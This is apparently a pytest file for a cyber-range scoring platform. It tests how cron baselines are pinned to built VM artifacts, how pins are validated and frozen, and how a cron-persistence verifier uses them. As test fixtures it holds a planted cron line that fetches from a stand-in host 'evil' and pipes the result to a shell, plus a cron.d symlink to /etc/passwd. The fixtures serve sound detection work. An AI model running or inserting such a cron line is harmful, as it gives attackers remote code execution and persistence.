"""Plan 18 — trusted cron baselines bound to built artifacts (fast layer).

The cron verifier v3 refuses to call a clean-looking /etc/cron.d clean on
FILENAME alone (filenames are exactly what persistence malware reuses), so
before the pins existed the check could only ever answer UNKNOWN. These
tests prove the whole pin lifecycle WITHOUT booting anything:

* capture from a clean artifact tree, pin build, validation, document
  round-trip;
* pins are honoured ONLY while the artifact the deployment ACTUALLY RUNS
  ON matches the pin — the role, the template ID and the artifact digest
  recorded at clone time into the immutable deployment resource must all
  match; anything else degrades to UNKNOWN (never a pass, never a guess).
  Template-only trust was the review finding: template numbers survive
  rebuilds, so it would honour hashes for bytes that were never deployed;
* the runtime injection into the verifier arguments (matching deployed
  artifact injects; wrong digest, wrong template, unknown role, absent/
  corrupt/malformed-typed pin, or an explicit snapshot baseline all keep
  the check honestly UNKNOWN);
* end-to-end through the REAL verifier v3: pinned-clean passes the blue
  'expect: absent' check, a content-tampered baseline file fails it
  deterministically, no pin stays UNKNOWN;
* the CLI re-pins one role at a time (merge preserving other pins) and
  refuses when an artifact's cron state drifted from its pin.
"""
from __future__ import annotations

import hashlib
import json
import pathlib

import pytest

from infra.images import cron_baseline as cb
from verifiers.base import Context
from verifiers.library.flag_file import CronPersistencePresent

ROLE = "mojang-web-local"
TID = 9011
CLEAN_CRON = "30 3 * * root . /etc/default/rcS; e2scruball\n"


def _sha(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def _tree(tmp_path: pathlib.Path) -> pathlib.Path:
    """A clean built-artifact rootfs tree as image-build leaves it."""
    root = tmp_path / "tree"
    cron_d = root / "etc" / "cron.d"
    cron_d.mkdir(parents=True)
    (cron_d / "e2scrub_all").write_text(CLEAN_CRON)
    spool = root / "var/spool/cron/crontabs"
    spool.mkdir(parents=True)
    (spool / "root").write_text("@reboot /usr/local/bin/sr-boot-note\n")
    return root


def _pin(role: str = ROLE, *, tid: int = TID,
         digest: str = "a" * 64) -> dict:
    return cb.build_pin(role, artifact_sha256=digest,
                        artifact_version="2026.10", template_id=tid,
                        capture={"files": {"e2scrub_all": _sha(
                            CLEAN_CRON.encode())},
                            "root_crontab_sha256": None})


# --------------------------------------------------------------------------- #
# capture / build / validate / round-trip                                       #
# --------------------------------------------------------------------------- #

def test_capture_binds_tree_content_and_skips_symlinks(tmp_path):
    tree = _tree(tmp_path)
    # a symlink, a directory and a nested path must never enter a pin
    (tree / "etc" / "cron.d" / "evil").symlink_to("/etc/passwd")
    (tree / "etc" / "cron.d" / "subdir").mkdir()
    cap = cb.capture_from_tree(tree)
    assert set(cap["files"]) == {"e2scrub_all"}
    assert cap["files"]["e2scrub_all"] == _sha(CLEAN_CRON.encode())
    assert cap["root_crontab_sha256"] == _sha(
        (tree / "var/spool/cron/crontabs/root").read_bytes())


def test_pin_document_round_trips_and_validates(tmp_path):
    pins = {ROLE: _pin()}
    doc = tmp_path / "cron-baselines.json"
    cb.dump_pins(doc, pins)
    assert cb.load_pins(doc) == pins


def test_tampered_or_unsafe_pins_make_the_whole_document_absent(tmp_path):
    doc = tmp_path / "pins.json"
    good = _pin()

    def load(payload):
        doc.write_text(json.dumps(payload))
        return cb.load_pins(doc)

    wrapped = lambda pin: {"schema": cb.SCHEMA, "pins": {ROLE: pin}}  # noqa: E731
    assert load(wrapped({**good, "files": {"x": "nope"}})) == {}
    assert load(wrapped({**good, "captured_from": "live"})) == {}
    assert load(wrapped({**good, "files": {
        "/etc/cron.d/x": good["files"]["e2scrub_all"]}})) == {}
    assert load(wrapped({**good, "template_id": "9011"})) == {}
    # schema must be an EXPLICIT integer: Python equality would accept
    # True and 1.0 as version 1 (second review, finding 3)
    assert load(wrapped({**good, "schema": True})) == {}
    assert load(wrapped({**good, "schema": 1.0})) == {}
    assert load({"schema": True, "pins": {ROLE: good}}) == {}
    assert load({"schema": 1.0, "pins": {ROLE: good}}) == {}
    assert load({"schema": "1", "pins": {ROLE: good}}) == {}
    assert load({"schema": 99, "pins": {ROLE: good}}) == {}
    assert load({"schema": cb.SCHEMA, "pins": {ROLE: "nope"}}) == {}
    assert load(wrapped(good)) == {ROLE: good}


ART = {"role": ROLE, "template_vmid": TID, "artifact_sha256": "a" * 64}


def _baseline(pin: dict | None = None):
    """What deploy-time freezing produces for the default pin."""
    return cb.freeze_baseline({ROLE: pin or _pin()}, ROLE,
                              artifact_sha256="a" * 64, template_vmid=TID)


def _art(**over):
    return {**ART, "baseline": _baseline(), **over}


def test_pins_are_bound_to_digest_template_and_role_together():
    pins = {ROLE: _pin()}
    assert cb.trusted_hashes_for_deployment(
        pins, ROLE, artifact_sha256="a" * 64, template_vmid=TID) == \
        pins[ROLE]["files"]
    # each binding alone must be sufficient to REFUSE (review finding:
    # a stable template ID may never carry trust across a rebuild)
    assert cb.trusted_hashes_for_deployment(
        pins, ROLE, artifact_sha256="b" * 64, template_vmid=TID) == {}
    assert cb.trusted_hashes_for_deployment(
        pins, ROLE, artifact_sha256="a" * 64, template_vmid=9012) == {}
    assert cb.trusted_hashes_for_deployment(
        pins, "mojang-web-db", artifact_sha256="a" * 64,
        template_vmid=TID) == {}
    assert cb.trusted_hashes_for_deployment(
        pins, None, artifact_sha256="a" * 64, template_vmid=TID) == {}
    assert cb.trusted_hashes_for_deployment(
        pins, ROLE, artifact_sha256=None, template_vmid=TID) == {}
    assert cb.trusted_hashes_for_deployment(
        pins, ROLE, artifact_sha256="a" * 64, template_vmid=None) == {}
    assert cb.trusted_hashes_for_deployment(
        {}, ROLE, artifact_sha256="a" * 64, template_vmid=TID) == {}
    # digest binding (release artifact re-verified before trust)
    assert cb.trusted_hashes(pins, ROLE, "A" * 64) == pins[ROLE]["files"]
    assert cb.trusted_hashes(pins, ROLE, "b" * 64) == {}


def test_freeze_binding_and_frozen_reads(tmp_path):
    """Pure primitives of the frozen-baseline flow (second review,
    finding 1): freeze only from a binding pin, bind-only revocation never
    returns hashes, and the integrity reference gates every read."""
    pins = {ROLE: _pin()}
    # freeze from a binding identity
    base = cb.freeze_baseline(pins, ROLE, artifact_sha256="a" * 64,
                              template_vmid=TID)
    assert base["files"] == pins[ROLE]["files"]
    assert base["baseline_sha256"] == cb.baseline_digest(
        base["files"], base["root_crontab_sha256"])
    # canonical: digest independent of dict insertion order
    assert cb.baseline_digest({"b": "2", "a": "1"}, None) == \
        cb.baseline_digest({"a": "1", "b": "2"}, None)
    # freeze refuses a non-binding identity
    assert cb.freeze_baseline(pins, ROLE, artifact_sha256="b" * 64,
                              template_vmid=TID) == {}
    assert cb.freeze_baseline(pins, ROLE, artifact_sha256="a" * 64,
                              template_vmid=1) == {}
    assert cb.freeze_baseline({}, ROLE, artifact_sha256="a" * 64,
                              template_vmid=TID) == {}
    # binding check never yields hashes
    assert cb.artifact_binding_ok(pins, ROLE, artifact_sha256="a" * 64,
                                  template_vmid=TID) is True
    assert cb.artifact_binding_ok(pins, ROLE, artifact_sha256="e" * 64,
                                  template_vmid=TID) is False
    # frozen reads gate on the integrity reference and value shapes
    assert cb.frozen_hashes(base) == pins[ROLE]["files"]
    assert cb.frozen_hashes({**base, "files": {
        "e2scrub_all": "f" * 64}}) == {}
    assert cb.frozen_hashes({**base, "root_crontab_sha256": 123}) == {}
    assert cb.frozen_hashes({**base,
                             "files": {"e2scrub_all": "NOTHEX"}}) == {}
    assert cb.frozen_hashes({}) == {}
    assert cb.frozen_hashes(None) == {}


# --------------------------------------------------------------------------- #
# runtime injection                                                             #
# --------------------------------------------------------------------------- #

def test_injection_only_for_the_deployed_artifact_and_cron_verifier():
    import srplatform.verification_service as vs
    pins = {ROLE: _pin()}
    # what cron_artifact_map reads back from deployment resources:
    # web01 was cloned from the pinned artifact; db01 from a rebuild whose
    # recorded digest no pin covers; web02 has no recorded identity at all
    # (deployed before the identity existed) — all honest UNKNOWNs.
    artifacts = {"web01": _art(), "db01": _art(role="mojang-web-db",
                                               template_vmid=9012,
                                               artifact_sha256="c" * 64)}

    base = {"host": "web01", "baseline_files": ["e2scrub_all"]}
    out = vs.with_cron_baseline(dict(base),
                                verifier_id="cron_persistence_present",
                                host="web01", artifacts=artifacts, pins=pins)
    assert out["baseline_file_sha256"] == pins[ROLE]["files"]
    assert out["baseline_files"] == ["e2scrub_all"]     # snapshot untouched

    # wrong digest recorded / other verifier / no pins / no recorded
    # identity: args pass through unchanged (the check stays UNKNOWN)
    db = dict(base, host="db01")
    assert vs.with_cron_baseline(dict(db),
                                 verifier_id="cron_persistence_present",
                                 host="db01", artifacts=artifacts,
                                 pins=pins) == db
    nofid = dict(base, host="web02")
    assert vs.with_cron_baseline(dict(nofid),
                                 verifier_id="cron_persistence_present",
                                 host="web02", artifacts=artifacts,
                                 pins=pins) == nofid
    assert vs.with_cron_baseline(dict(base), verifier_id="service_running",
                                 host="web01", artifacts=artifacts,
                                 pins=pins) == base
    assert vs.with_cron_baseline(dict(base),
                                 verifier_id="cron_persistence_present",
                                 host="web01", artifacts=artifacts,
                                 pins={}) == base
    # a deployment that recorded the WRONG digest for the same template
    # (rebuilt artifact, old pin) is refused
    rebuilt = {"web01": _art(artifact_sha256="d" * 64)}
    assert vs.with_cron_baseline(dict(base),
                                 verifier_id="cron_persistence_present",
                                 host="web01", artifacts=rebuilt,
                                 pins=pins) == base
    # an explicit snapshot baseline always wins over injection
    explicit = dict(base, baseline_file_sha256={"e2scrub_all": "f" * 64})
    assert vs.with_cron_baseline(dict(explicit),
                                 verifier_id="cron_persistence_present",
                                 host="web01", artifacts=artifacts,
                                 pins=pins) == explicit


def test_load_cron_pins_is_tolerant_of_absence_or_corruption(monkeypatch,
                                                             tmp_path):
    import srplatform.verification_service as vs

    def use(value):
        class _S:
            cron_baseline_file = value
        monkeypatch.setattr(vs, "get_settings", lambda: _S())

    use("")
    assert vs.load_cron_pins() == {}
    use(str(tmp_path / "absent.json"))
    assert vs.load_cron_pins() == {}          # absent file == no pins
    (tmp_path / "bad.json").write_text("{not json")
    use(str(tmp_path / "bad.json"))
    assert vs.load_cron_pins() == {}          # corrupt file == no pins
    doc = tmp_path / "good.json"
    cb.dump_pins(doc, {ROLE: _pin()})
    use(str(doc))
    assert vs.load_cron_pins() == {ROLE: _pin()}


# --------------------------------------------------------------------------- #
# end to end through the REAL verifier v3                                       #
# --------------------------------------------------------------------------- #

class _FakeExec:
    """Answers the v3 structured cron probe from a fake guest inventory."""

    def __init__(self, files: dict[str, tuple[str, int]]):
        # name -> (content, uid); regular, root-owned, 0644
        self.files = files

    def __call__(self, host: str, command: str) -> tuple[int, str]:
        assert "/etc/cron.d" in command and "crontab" in command
        out = {"files": {}, "crontab": ""}
        for name, (content, uid) in self.files.items():
            data = content.encode()
            out["files"][name] = {"uid": uid, "gid": 0, "mode": 0o644,
                                  "size": len(data), "type": "regular",
                                  "sha256": _sha(data),
                                  "symlink_target": None}
        return 0, json.dumps(out)


def _clean_files():
    return {"e2scrub_all": (CLEAN_CRON, 0)}


BLUE_ARGS = {"host": "web01", "baseline_files": ["e2scrub_all"],
             "expect": "absent"}


def _evaluate(exec_fn, args):
    return CronPersistencePresent().evaluate(
        Context(exec=exec_fn, hosts={"web01": "10.0.0.2"}), **args)


def test_pinned_clean_guest_now_passes_deterministically(tmp_path):
    """The blue 'cron absent' check was UNKNOWN forever; with a pin bound
    to the artifact this session cloned from, it now decides."""
    import srplatform.verification_service as vs
    pins = {ROLE: _pin()}
    args = vs.with_cron_baseline(dict(BLUE_ARGS),
                                 verifier_id="cron_persistence_present",
                                 host="web01", artifacts={"web01": _art()},
                                 pins=pins)
    out = _evaluate(_FakeExec(_clean_files()), args)
    assert out.status == "passed", out.evidence

    # and the same truth inverts for the red polarity (nothing found)
    red = dict(args, expect="true")
    assert _evaluate(_FakeExec(_clean_files()), red).status == "failed"


def test_pinned_check_fails_on_content_tampering(tmp_path):
    """A persistence plant that REUSES the trusted filename is caught: the
    digest no longer matches, so it is unexpected — deterministically."""
    import srplatform.verification_service as vs
    pins = {ROLE: _pin()}
    args = vs.with_cron_baseline(dict(BLUE_ARGS),
                                 verifier_id="cron_persistence_present",
                                 host="web01", artifacts={"web01": _art()},
                                 pins=pins)
    tampered = {"e2scrub_all": ("* * * * * root curl evil|sh\n", 0)}
    out = _evaluate(_FakeExec(tampered), args)
    assert out.status == "failed"
    assert "e2scrub_all" in out.evidence["unexpected_files"]

    # an ADDED file is unexpected too (even next to a trusted one)
    extra = dict(_clean_files())
    extra["shadowguard"] = ("* * * * * root /tmp/x\n", 0)
    out = _evaluate(_FakeExec(extra), args)
    assert out.status == "failed"
    assert "shadowguard" in out.evidence["unexpected_files"]


def test_unpinned_check_stays_unknown_never_clean():
    """Without a pin the filename-only baseline still cannot establish
    clean state — the historical UNKNOWN behaviour is unchanged."""
    out = _evaluate(_FakeExec(_clean_files()), dict(BLUE_ARGS))
    assert out.status == "unknown"
    assert "trusted cron content baseline missing" in (out.error or "")
    # an explicit snapshot hash still works without any pin file
    explicit = dict(BLUE_ARGS,
                    baseline_file_sha256={"e2scrub_all": _sha(
                        CLEAN_CRON.encode())})
    assert _evaluate(_FakeExec(_clean_files()), explicit).status == "passed"


def test_stale_pin_yields_unknown_not_a_pass(tmp_path):
    """Artifact was rebuilt (new template map) — the pin is refused and
    the check degrades to UNKNOWN, never silently to a pass."""
    import srplatform.verification_service as vs
    pins = {ROLE: _pin()}
    stale = vs.with_cron_baseline(dict(BLUE_ARGS),
                                  verifier_id="cron_persistence_present",
                                  host="web01",
                                  artifacts={"web01": _art(
                                      template_vmid=9099)},  # rebuilt host
                                  pins=pins)
    assert "baseline_file_sha256" not in stale
    assert _evaluate(_FakeExec(_clean_files()), stale).status == "unknown"


def test_wrong_digest_pin_never_passes_the_real_verifier(tmp_path):
    """Reviewer reproduction: a pin whose digest does not match the
    artifact the session was cloned from must yield UNKNOWN through the
    REAL verifier, even though the guest's cron files match the pin's
    content hashes exactly (the pre-fix template-only trust said PASS)."""
    import srplatform.verification_service as vs
    pins = {ROLE: _pin(digest="a" * 64)}           # pin claims artifact A
    deployed = _art(artifact_sha256="b" * 64)      # session cloned artifact B
    args = vs.with_cron_baseline(dict(BLUE_ARGS),
                                 verifier_id="cron_persistence_present",
                                 host="web01",
                                 artifacts={"web01": deployed}, pins=pins)
    assert "baseline_file_sha256" not in args
    out = _evaluate(_FakeExec(_clean_files()), args)
    assert out.status == "unknown", out.evidence


def test_replacing_the_pin_after_launch_revokes_but_never_forges(tmp_path):
    """A session's recorded identity + FROZEN baseline are immutable
    deploy-time data.  After launch the operator may REPLACE the pin file:
    a pin bound to the SAME deployed identity leaves the frozen baseline
    untouched; a replacement whose identity drifts (a rebuild) can only
    REVOKE — never flip an existing session's cron check to a pass.
    (Second review: the pre-fix code re-read the CURRENT file's hashes at
    scoring time, so 'revoke' here meant even an in-place edit bound to
    the same digest silently rewrote what counted as clean.)"""
    import srplatform.verification_service as vs
    pins = {ROLE: _pin(digest="a" * 64)}
    args = vs.with_cron_baseline(dict(BLUE_ARGS),
                                 verifier_id="cron_persistence_present",
                                 host="web01", artifacts={"web01": _art()},
                                 pins=pins)
    assert _evaluate(_FakeExec(_clean_files()), args).status == "passed"
    # replacement: same role/template, DIFFERENT digest (rebuilt artifact)
    replaced = {ROLE: _pin(digest="e" * 64)}
    post = vs.with_cron_baseline(dict(BLUE_ARGS),
                                 verifier_id="cron_persistence_present",
                                 host="web01", artifacts={"web01": _art()},
                                 pins=replaced)
    assert "baseline_file_sha256" not in post
    assert _evaluate(_FakeExec(_clean_files()), post).status == "unknown"
    # pin file gone entirely: revocation degrades to UNKNOWN, no crash
    gone = vs.with_cron_baseline(dict(BLUE_ARGS),
                                 verifier_id="cron_persistence_present",
                                 host="web01", artifacts={"web01": _art()},
                                 pins={})
    assert _evaluate(_FakeExec(_clean_files()), gone).status == "unknown"


PLANTED = "* * * * * root curl evil|sh\n"


def test_same_digest_pin_edit_never_rewrites_history(tmp_path):
    """Second review finding 1 (HIGH) reproduction: after a session's
    bytes were persisted as FAILED, edit ONLY pins[role]['files'] to the
    payload's own hash — role, template and artifact digest untouched —
    and re-score the SAME stored guest bytes.  Pre-fix this returned
    PASSED/10 points, because the current mutable file decided what was
    clean.  Post-fix the session scores from its FROZEN baseline: the
    verdict never changes, and an explicit policy revocation (identity
    drift or pin removal) may only degrade trust to UNKNOWN — never
    adopt new hashes."""
    import srplatform.verification_service as vs
    planted = {"e2scrub_all": (PLANTED, 0)}
    frozen_art = _art()
    # initial scoring: planted persistence FAILED
    args = vs.with_cron_baseline(dict(BLUE_ARGS),
                                 verifier_id="cron_persistence_present",
                                 host="web01",
                                 artifacts={"web01": frozen_art},
                                 pins={ROLE: _pin()})
    assert _evaluate(_FakeExec(planted), args).status == "failed"
    # the edit: pin keeps role/template/digest; only FILES match the plant
    edited_pin = _pin()
    edited_pin["files"]["e2scrub_all"] = _sha(PLANTED.encode())
    rescored = vs.with_cron_baseline(dict(BLUE_ARGS),
                                     verifier_id="cron_persistence_present",
                                     host="web01",
                                     artifacts={"web01": frozen_art},
                                     pins={ROLE: edited_pin})
    out = _evaluate(_FakeExec(planted), rescored)
    assert out.status == "failed", \
        f"same-digest pin edit must never turn bad content clean: {out.status}"
    # a CLEAN guest stays passing on the frozen truth (no drift either way)
    assert _evaluate(_FakeExec(_clean_files()), rescored).status == "passed"
    # revocation degrades to UNKNOWN, never to a pass
    revoked = vs.with_cron_baseline(dict(BLUE_ARGS),
                                    verifier_id="cron_persistence_present",
                                    host="web01",
                                    artifacts={"web01": frozen_art},
                                    pins={})
    assert _evaluate(_FakeExec(_clean_files()), revoked).status == "unknown"


def test_historical_or_corrupt_frozen_baselines_stay_unknown():
    """Second review: sessions deployed before a baseline was frozen (or
    whose frozen evidence was tampered/corrupted) must NOT pass — the
    integrity reference gates every read, and no post-hoc pin document
    substitutes for the missing freeze."""
    import srplatform.verification_service as vs
    pins = {ROLE: _pin()}
    base_args = dict(BLUE_ARGS)

    def status(art):
        args = vs.with_cron_baseline(dict(base_args),
                                     verifier_id="cron_persistence_present",
                                     host="web01",
                                     artifacts={"web01": art}, pins=pins)
        assert "baseline_file_sha256" not in args
        return _evaluate(_FakeExec(_clean_files()), args).status

    historical = {**ART}                                  # never frozen
    assert status(historical) == "unknown"
    tampered = {**ART, "baseline": {**_baseline(),
                                    "files": {"e2scrub_all": "f" * 64}}}
    assert status(tampered) == "unknown"                  # digest mismatch
    assert status({**ART, "baseline": {}}) == "unknown"
    assert status({**ART, "baseline": {"files": {"e2scrub_all": "nope"}}}) \
        == "unknown"


def test_frozen_baselines_are_per_session_isolated():
    """Two sessions on different artifacts each score from their OWN
    frozen baseline; neither pin document nor the other session's freeze
    can reach across."""
    import srplatform.verification_service as vs
    other_pin = cb.build_pin("mojang-web-db", artifact_sha256="c" * 64,
                             artifact_version="v2", template_id=9012,
                             capture={"files": {"otherjob": _sha(
                                 CLEAN_CRON.encode())},
                                 "root_crontab_sha256": None})
    art_a = _art()
    art_b = {"role": "mojang-web-db", "template_vmid": 9012,
             "artifact_sha256": "c" * 64,
             "baseline": cb.freeze_baseline({"mojang-web-db": other_pin},
                                            "mojang-web-db",
                                            artifact_sha256="c" * 64,
                                            template_vmid=9012)}
    pins = {ROLE: _pin(), "mojang-web-db": other_pin}
    out_a = vs.with_cron_baseline(dict(BLUE_ARGS),
                                  verifier_id="cron_persistence_present",
                                  host="web01", artifacts={"web01": art_a},
                                  pins=pins)
    out_b = vs.with_cron_baseline(dict(BLUE_ARGS),
                                  verifier_id="cron_persistence_present",
                                  host="web01", artifacts={"web01": art_b},
                                  pins=pins)
    assert out_a["baseline_file_sha256"] == _pin()["files"]
    assert set(out_b["baseline_file_sha256"]) == {"otherjob"}


# --------------------------------------------------------------------------- #
# hostile pin documents (review finding: malformed values must not crash)       #
# --------------------------------------------------------------------------- #

def test_malformed_pin_values_degrade_to_unknown_never_crash(tmp_path):
    """load_pins backs production scoring: an int digest, a null digest,
    nested junk, a non-string root crontab or an unhashable files entry
    must behave exactly like an ABSENT pin — never a TypeError escaping
    through check_objective or build_scorecard."""
    doc = tmp_path / "pins.json"
    good = _pin()

    def load(payload):
        doc.write_text(json.dumps(payload))
        return cb.load_pins(doc)          # must never raise

    wrapped = lambda pin: {"schema": cb.SCHEMA, "pins": {ROLE: pin}}  # noqa: E731
    hostile = [
        {**good, "artifact_sha256": 123},
        {**good, "artifact_sha256": None},
        {**good, "artifact_sha256": {"x": 1}},
        {**good, "artifact_sha256": True},
        {**good, "artifact_version": 2026.10},
        {**good, "artifact_version": None},
        {**good, "template_id": None},
        {**good, "template_id": True},
        {**good, "root_crontab_sha256": 123},
        {**good, "root_crontab_sha256": True},
        {**good, "files": {"e2scrub_all": 123}},
        {**good, "files": {"e2scrub_all": None}},
        {**good, "files": {"e2scrub_all": {"sha": "a" * 64}}},
        {**good, "files": [1, 2]},
        {**good, "schema": "1"},
        {**good, "schema": True},
        {**good, "schema": 1.0},
        [1, 2, 3],
        "pins",
    ]
    for bad in hostile:
        assert load(wrapped(bad)) == {}, bad
    assert load({"schema": cb.SCHEMA, "pins": ["not-a-dict"]}) == {}
    assert load(wrapped(good)) == {ROLE: good}
    # and the hostile document feeds the injection as ABSENT pins: unknown
    import srplatform.verification_service as vs
    doc_ok = tmp_path / "hostile.json"
    doc_ok.write_text(json.dumps(
        wrapped({**good, "artifact_sha256": 123})))
    class _S:
        cron_baseline_file = str(doc_ok)
    vs.get_settings = lambda: _S()
    try:
        assert vs.load_cron_pins() == {}
        args = vs.with_cron_baseline(
            dict(BLUE_ARGS), verifier_id="cron_persistence_present",
            host="web01", artifacts={"web01": _art()},
            pins=vs.load_cron_pins())
        assert "baseline_file_sha256" not in args
        assert _evaluate(_FakeExec(_clean_files()), args).status == "unknown"
    finally:
        from srplatform.settings import get_settings
        vs.get_settings = get_settings


def test_malformed_verify_marker_values_are_refused_not_laundered():
    """capture_from_verify_markers previously str()-coerced values: an int
    digest must be REFUSED (ValueError), never laundered into trust."""
    for payload in ('{"files": {"x": 123}}',
                    '{"files": {"x": null}}',
                    '{"files": {"x": 1}, "root_crontab_sha256": 2}'):
        with pytest.raises(ValueError, match="invalid"):
            cb.capture_from_verify_markers(
                [f"SR-GUEST-CRON-PIN {payload}"])
    # a well-formed marker still parses
    good = json.dumps({"files": {"x": "a" * 64},
                       "root_crontab_sha256": None})
    assert cb.capture_from_verify_markers(
        [f"SR-GUEST-CRON-PIN {good}"])["files"] == {"x": "a" * 64}


# --------------------------------------------------------------------------- #
# CLI: per-role capture, merge, drift refusal                                   #
# --------------------------------------------------------------------------- #

def _release(tmp_path: pathlib.Path):
    image = tmp_path / "mojang-web-local.qcow2"
    image.write_bytes(b"FAKEQCOW" * 8)
    return image, _tree(tmp_path)


def test_cli_capture_then_verify_roundtrip_and_role_merge(tmp_path):
    image, tree = _release(tmp_path)
    out = tmp_path / "cron-baselines.json"
    digest = _sha(image.read_bytes())

    assert cb.main(["capture", "--role", ROLE, "--tree", str(tree),
                    "--image", str(image), "--template-id", str(TID),
                    "--out", str(out)]) == 0
    pins = cb.load_pins(out)
    assert pins[ROLE]["artifact_sha256"] == digest
    assert pins[ROLE]["template_id"] == TID

    assert cb.main(["verify", "--pin", str(out), "--role", ROLE,
                    "--tree", str(tree)]) == 0

    # a second role's capture MERGES (unchanged roles keep their pins)
    image2 = tmp_path / "mojang-web-db.qcow2"
    image2.write_bytes(b"OTHER")
    tree2 = _tree(tmp_path / "db")
    assert cb.main(["capture", "--role", "mojang-web-db", "--tree", str(tree2),
                    "--image", str(image2), "--template-id", "9012",
                    "--out", str(out)]) == 0
    pins = cb.load_pins(out)
    assert set(pins) == {ROLE, "mojang-web-db"}
    assert pins[ROLE]["artifact_sha256"] == digest

    # a changed artifact must NOT silently re-pin: verify refuses, loudly
    (tree / "etc" / "cron.d" / "newfoot.sql").write_text("-- added\n")
    assert cb.main(["verify", "--pin", str(out), "--role", ROLE,
                    "--tree", str(tree)]) == 1


def test_capture_from_verify_markers_parses_the_clean_boot():
    cap = {"files": {"e2scrub_all": _sha(CLEAN_CRON.encode())},
           "root_crontab_sha256": None}
    marker = "SR-GUEST-CRON-PIN " + json.dumps(cap, sort_keys=True)
    parsed = cb.capture_from_verify_markers(
        ["SR-GUEST-BOOT-PASS", marker, "SR-GUEST-DONE"])
    assert parsed == cap

    with pytest.raises(ValueError, match="no SR-GUEST-CRON-PIN"):
        cb.capture_from_verify_markers(["SR-GUEST-DONE"])
    with pytest.raises(ValueError, match="invalid"):
        cb.capture_from_verify_markers(["SR-GUEST-CRON-PIN {broken"])
    # the double emission survives ONE corrupted line, never bad trust
    good = json.dumps({"files": {"e2scrub_all": _sha(CLEAN_CRON.encode())},
                       "root_crontab_sha256": None}, sort_keys=True)
    parsed = cb.capture_from_verify_markers(
        ["SR-GUEST-CRON-PIN {trunc", f"SR-GUEST-CRON-PIN {good}"])
    assert parsed["files"]["e2scrub_all"] == _sha(CLEAN_CRON.encode())
    with pytest.raises(ValueError, match="invalid entry"):
        cb.capture_from_verify_markers(
            ['SR-GUEST-CRON-PIN {"files": {"x": "nothash"}}'])
